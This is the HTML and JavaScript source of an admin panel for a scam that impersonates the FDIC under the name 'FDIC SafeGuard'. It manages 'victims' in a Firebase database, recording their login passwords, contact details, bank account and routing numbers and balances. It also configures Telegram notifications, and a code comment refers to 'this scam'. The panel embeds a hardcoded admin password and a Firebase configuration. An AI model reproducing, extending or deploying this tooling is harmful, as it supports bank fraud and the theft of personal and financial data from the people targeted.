<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FDIC SafeGuard - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --fdic-blue: #003366;
            --fdic-light-blue: #004d99;
            --bg-color: #f4f6f8;
            --text-color: #333;
            --white: #ffffff;
            --success: #28a745;
            --danger: #dc3545;
            --border: #ddd;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }

        body { background-color: var(--bg-color); color: var(--text-color); height: 100vh; display: flex; flex-direction: column; }

        /* Login Overlay */
        #login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--fdic-blue); display: flex; justify-content: center; align-items: center;
            z-index: 1000; transition: opacity 0.3s;
        }
        .login-card {
            background: var(--white); padding: 2rem; border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2); width: 100%; max-width: 350px; text-align: center;
        }
        .login-card h2 { color: var(--fdic-blue); margin-bottom: 1.5rem; }
        .form-group { margin-bottom: 1rem; text-align: left; }
        .form-group label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; font-weight: 600; }
        .form-group input {
            width: 100%; padding: 0.75rem; border: 1px solid var(--border);
            border-radius: 4px; font-size: 1rem;
        }
        .btn {
            width: 100%; padding: 0.75rem; border: none; border-radius: 4px;
            font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s;
        }
        .btn-primary { background: var(--fdic-blue); color: var(--white); }
        .btn-primary:hover { background: var(--fdic-light-blue); }
        .btn-success { background: var(--success); color: var(--white); width: auto; padding: 0.5rem 1rem; }
        .btn-danger { background: var(--danger); color: var(--white); width: auto; padding: 0.5rem 1rem; }

        /* Main Admin Layout */
        #admin-panel { display: none; flex: 1; padding: 1rem; max-width: 1200px; margin: 0 auto; width: 100%; }
        
        header {
            display: flex; justify-content: space-between; align-items: center;
            background: var(--white); padding: 1rem; border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 1.5rem;
        }
        header h1 { color: var(--fdic-blue); font-size: 1.5rem; }
        
        .config-section {
            background: var(--white); padding: 1rem; border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 1.5rem;
            border-left: 4px solid var(--fdic-blue);
        }
        .config-row { display: flex; gap: 1rem; flex-wrap: wrap; }
        .config-row .form-group { flex: 1; min-width: 200px; }

        .victim-list {
            background: var(--white); border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05); overflow: hidden;
        }
        .list-header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 1rem; border-bottom: 1px solid var(--border);
        }
        .victim-item {
            display: flex; justify-content: space-between; align-items: center;
            padding: 1rem; border-bottom: 1px solid var(--border);
            transition: background 0.2s;
        }
        .victim-item:last-child { border-bottom: none; }
        .victim-item:hover { background: #f9fafb; }
        .victim-info h3 { font-size: 1rem; color: var(--fdic-blue); }
        .victim-info p { font-size: 0.85rem; color: #666; }
        .victim-actions { display: flex; gap: 0.5rem; }

        /* Modal */
        .modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 2000; justify-content: center; align-items: center;
        }
        .modal-content {
            background: var(--white); padding: 1.5rem; border-radius: 8px;
            width: 90%; max-width: 500px; max-height: 90vh; overflow-y: auto;
        }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
        .modal-header h2 { color: var(--fdic-blue); font-size: 1.2rem; }
        .close-modal { background: none; border: none; font-size: 1.5rem; cursor: pointer; }

        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
        .full-width { grid-column: span 2; }

        @media (max-width: 600px) {
            .grid-2 { grid-template-columns: 1fr; }
            .config-row { flex-direction: column; }
            .victim-item { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
            .victim-actions { width: 100%; justify-content: flex-end; }
        }
    </style>
</head>
<body>

    <!-- Login Overlay -->
    <div id="login-overlay">
        <div class="login-card">
            <h2>Admin Login</h2>
            <div class="form-group">
                <label>Username</label>
                <input type="text" id="admin-user" placeholder="admin">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="admin-pass" placeholder="Chxphard$1">
            </div>
            <button class="btn btn-primary" id="login-btn">Login</button>
            <p id="login-error" style="color: var(--danger); margin-top: 1rem; font-size: 0.9rem;"></p>
        </div>
    </div>

    <!-- Admin Panel -->
    <div id="admin-panel">
        <header>
            <h1><i class="fas fa-shield-alt"></i> FDIC SafeGuard Admin</h1>
            <button class="btn btn-primary" id="add-victim-btn"><i class="fas fa-plus"></i> Add Victim</button>
        </header>

        <!-- Telegram Config -->
        <div class="config-section">
            <h3 style="margin-bottom: 1rem; color: var(--fdic-blue);">Telegram Notifications</h3>
            <div class="config-row">
                <div class="form-group">
                    <label>Bot Token</label>
                    <input type="text" id="tg-token" placeholder="123456:ABC-DEF...">
                </div>
                <div class="form-group">
                    <label>Chat ID</label>
                    <input type="text" id="tg-chat-id" placeholder="-100123456789">
                </div>
                <div class="form-group" style="display: flex; align-items: flex-end;">
                    <button class="btn btn-primary" id="save-config-btn">Save Config</button>
                </div>
            </div>
            <p id="config-status" style="font-size: 0.85rem; color: var(--success); margin-top: 0.5rem;"></p>
        </div>

        <!-- Victim List -->
        <div class="victim-list">
            <div class="list-header">
                <h3>Managed Victims</h3>
            </div>
            <div id="victims-container">
                <!-- Victims loaded here -->
                <div style="padding: 2rem; text-align: center; color: #999;">Loading...</div>
            </div>
        </div>
    </div>

    <!-- Add/Edit Victim Modal -->
    <div id="victim-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-title">Add Victim</h2>
                <button class="close-modal" id="close-modal">&times;</button>
            </div>
            <form id="victim-form">
                <input type="hidden" id="victim-id">
                <div class="grid-2">
                    <div class="form-group">
                        <label>Username (Login)</label>
                        <input type="text" id="v-username" required>
                    </div>
                    <div class="form-group">
                        <label>Password</label>
                        <input type="text" id="v-password" required>
                    </div>
                    <div class="form-group">
                        <label>First Name</label>
                        <input type="text" id="v-fname" required>
                    </div>
                    <div class="form-group">
                        <label>Last Name</label>
                        <input type="text" id="v-lname" required>
                    </div>
                    <div class="form-group">
                        <label>Email</label>
                        <input type="email" id="v-email" required>
                    </div>
                    <div class="form-group">
                        <label>Phone</label>
                        <input type="text" id="v-phone" required>
                    </div>
                    <div class="form-group full-width">
                        <label>Address</label>
                        <input type="text" id="v-address" required>
                    </div>
                    <div class="form-group">
                        <label>Account Number</label>
                        <input type="text" id="v-acct-num" required>
                    </div>
                    <div class="form-group">
                        <label>Last 4 Digits</label>
                        <input type="text" id="v-acct-last4" required>
                    </div>
                    <div class="form-group">
                        <label>Balance ($)</label>
                        <input type="number" id="v-balance" step="0.01" required>
                    </div>
                    <div class="form-group">
                        <label>Routing Number</label>
                        <input type="text" id="v-routing" required>
                    </div>
                    <div class="form-group full-width">
                        <label>Case Number</label>
                        <input type="text" id="v-case-num" required>
                    </div>
                </div>
                <div style="margin-top: 1rem; text-align: right;">
                    <button type="button" class="btn btn-danger" id="delete-victim-btn" style="display:none; margin-right: 0.5rem;">Delete</button>
                    <button type="submit" class="btn btn-success">Save Victim</button>
                </div>
            </form>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        // --- CONFIGURATION ---
        // REPLACE WITH YOUR FIREBASE CONFIG
        const firebaseConfig = {
  apiKey: "AIzaSyCi1fTBOHYz02MNaVD7aF_1bRlkWu3HgeQ",
  authDomain: "fdicprotects.firebaseapp.com",
  databaseURL: "https://fdicprotects-default-rtdb.firebaseio.com",
  projectId: "fdicprotects",
  storageBucket: "fdicprotects.firebasestorage.app",
  messagingSenderId: "1087204523962",
  appId: "1:1087204523962:web:ba359d8cf5981afeab2783"
};

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- DOM ELEMENTS ---
        const loginOverlay = document.getElementById('login-overlay');
        const adminPanel = document.getElementById('admin-panel');
        const loginBtn = document.getElementById('login-btn');
        const adminUserInput = document.getElementById('admin-user');
        const adminPassInput = document.getElementById('admin-pass');
        const loginError = document.getElementById('login-error');

        const addVictimBtn = document.getElementById('add-victim-btn');
        const victimModal = document.getElementById('victim-modal');
        const closeModal = document.getElementById('close-modal');
        const victimForm = document.getElementById('victim-form');
        const victimIdInput = document.getElementById('victim-id');
        const modalTitle = document.getElementById('modal-title');
        const deleteVictimBtn = document.getElementById('delete-victim-btn');
        const victimsContainer = document.getElementById('victims-container');

        const tgTokenInput = document.getElementById('tg-token');
        const tgChatIdInput = document.getElementById('tg-chat-id');
        const saveConfigBtn = document.getElementById('save-config-btn');
        const configStatus = document.getElementById('config-status');

        // --- AUTHENTICATION ---
        loginBtn.addEventListener('click', () => {
            const user = adminUserInput.value;
            const pass = adminPassInput.value;

            if (user === 'admin' && pass === 'Chxphard$1') {
                loginOverlay.style.opacity = '0';
                setTimeout(() => {
                    loginOverlay.style.display = 'none';
                    adminPanel.style.display = 'block';
                    loadConfig();
                    loadVictims();
                }, 300);
            } else {
                loginError.textContent = 'Invalid credentials';
            }
        });

        // --- TELEGRAM CONFIG ---
        async function loadConfig() {
            const snapshot = await get(ref(db, 'config/telegram'));
            if (snapshot.exists()) {
                const data = snapshot.val();
                tgTokenInput.value = data.botToken || '';
                tgChatIdInput.value = data.chatId || '';
            }
        }

        saveConfigBtn.addEventListener('click', () => {
            const token = tgTokenInput.value;
            const chatId = tgChatIdInput.value;
            
            set(ref(db, 'config/telegram'), {
                botToken: token,
                chatId: chatId
            }).then(() => {
                configStatus.textContent = 'Configuration Saved!';
                setTimeout(() => configStatus.textContent = '', 3000);
            });
        });

        // --- VICTIM MANAGEMENT ---
        async function loadVictims() {
            const snapshot = await get(ref(db, 'victims'));
            victimsContainer.innerHTML = '';
            
            if (!snapshot.exists()) {
                victimsContainer.innerHTML = '<div style="padding: 2rem; text-align: center; color: #999;">No victims found.</div>';
                return;
            }

            snapshot.forEach(childSnapshot => {
                const victim = childSnapshot.val();
                const id = childSnapshot.key;
                
                const div = document.createElement('div');
                div.className = 'victim-item';
                div.innerHTML = `
                    <div class="victim-info">
                        <h3>${victim.firstName} ${victim.lastName}</h3>
                        <p>User: ${victim.username} | Email: ${victim.email} | Balance: $${parseFloat(victim.account.balance).toLocaleString()}</p>
                    </div>
                    <div class="victim-actions">
                        <button class="btn btn-primary" onclick="window.editVictim('${id}')" style="padding: 0.4rem 0.8rem; font-size: 0.9rem;">Edit</button>
                    </div>
                `;
                victimsContainer.appendChild(div);
            });
        }

        addVictimBtn.addEventListener('click', () => {
            openModal();
        });

        function openModal(victimData = null) {
            victimModal.style.display = 'flex';
            if (victimData) {
                modalTitle.textContent = 'Edit Victim';
                deleteVictimBtn.style.display = 'inline-block';
                victimIdInput.value = victimData.id;
                document.getElementById('v-username').value = victimData.username;
                document.getElementById('v-password').value = victimData.password;
                document.getElementById('v-fname').value = victimData.firstName;
                document.getElementById('v-lname').value = victimData.lastName;
                document.getElementById('v-email').value = victimData.email;
                document.getElementById('v-phone').value = victimData.phone;
                document.getElementById('v-address').value = victimData.address;
                document.getElementById('v-acct-num').value = victimData.account.accountNumber;
                document.getElementById('v-acct-last4').value = victimData.account.lastFour;
                document.getElementById('v-balance').value = victimData.account.balance;
                document.getElementById('v-routing').value = victimData.account.routingNumber;
                document.getElementById('v-case-num').value = victimData.account.caseNumber;
            } else {
                modalTitle.textContent = 'Add Victim';
                deleteVictimBtn.style.display = 'none';
                victimForm.reset();
                victimIdInput.value = '';
            }
        }

        closeModal.addEventListener('click', () => {
            victimModal.style.display = 'none';
        });

        victimForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const id = victimIdInput.value;
            const username = document.getElementById('v-username').value;
            const password = document.getElementById('v-password').value;
            const firstName = document.getElementById('v-fname').value;
            const lastName = document.getElementById('v-lname').value;
            const email = document.getElementById('v-email').value;
            const phone = document.getElementById('v-phone').value;
            const address = document.getElementById('v-address').value;
            const accountNumber = document.getElementById('v-acct-num').value;
            const lastFour = document.getElementById('v-acct-last4').value;
            const balance = parseFloat(document.getElementById('v-balance').value);
            const routingNumber = document.getElementById('v-routing').value;
            const caseNumber = document.getElementById('v-case-num').value;

            const victimData = {
                username,
                password,
                firstName,
                lastName,
                email,
                phone,
                address,
                account: {
                    accountNumber,
                    lastFour,
                    balance,
                    routingNumber,
                    caseNumber,
                    createdAt: new Date().toISOString() // Always update creation time on edit or set new on create
                }
            };

            if (!id) {
                // New Victim
                victimData.account.createdAt = new Date().toISOString();
                await set(ref(db, `victims/${username}`), victimData);
            } else {
                // Edit Victim (Keep original createdAt if needed, or update)
                // For this scam, usually you want the "Claim Date" to be when the admin created it, 
                // but if you want it to update on edit, uncomment below:
                // victimData.account.createdAt = new Date().toISOString();
                await update(ref(db, `victims/${id}`), victimData);
            }

            victimModal.style.display = 'none';
            loadVictims();
        });

        deleteVictimBtn.addEventListener('click', async () => {
            const id = victimIdInput.value;
            if (confirm('Are you sure you want to delete this victim?')) {
                await remove(ref(db, `victims/${id}`));
                victimModal.style.display = 'none';
                loadVictims();
            }
        });

        // Expose edit function to global scope for inline HTML onclick
        window.editVictim = async (id) => {
            const snapshot = await get(ref(db, `victims/${id}`));
            if (snapshot.exists()) {
                const data = snapshot.val();
                data.id = id; // Attach ID for modal logic
                openModal(data);
            }
        };

        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target == victimModal) {
                victimModal.style.display = "none";
            }
        }
    </script>
</body>
</html>
